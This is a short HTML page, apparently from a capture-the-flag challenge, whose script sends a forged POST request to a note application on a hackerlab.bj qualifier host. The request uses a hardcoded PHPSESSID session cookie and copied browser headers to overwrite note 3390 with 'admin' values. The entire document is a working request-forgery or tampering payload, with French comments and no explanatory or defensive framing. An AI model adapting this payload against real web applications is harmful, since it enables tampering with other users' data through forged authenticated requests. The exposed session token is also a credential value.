<!DOCTYPE html>
<html>
  <body>
<script>
  // Les données à envoyer dans le corps de la requête
  const data = new URLSearchParams();
  data.append('note-title', 'admin');
  data.append('note-description', 'admin');

  fetch('https://xnotes.qualif.hackerlab.bj/note.php?id=3390', {
    method: 'POST',
    headers: {
      'Host': 'xnotes.qualif.hackerlab.bj',
      'Cookie': 'PHPSESSID=70b5662b1d32aac6151996fb9fde9863',
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.5',
      'Accept-Encoding': 'gzip, deflate, br',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': 'https://xnotes.qualif.hackerlab.bj',
      'Referer': 'https://xnotes.qualif.hackerlab.bj/note.php?id=3390',
      'Upgrade-Insecure-Requests': '1',
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-User': '?1',
      'Te': 'trailers',
      'Connection': 'close'
    },
    body: data
  })
  .then(response => {
    if (!response.ok) {
      throw new Error('Erreur de requête : ' + response.statusText);
    }
    return response.text();
  })
  .then(responseText => {
    console.log('Réponse :', responseText);
  })
  .catch(error => {
    console.error('Erreur :', error);
  });
</script>
  </body>
</html>
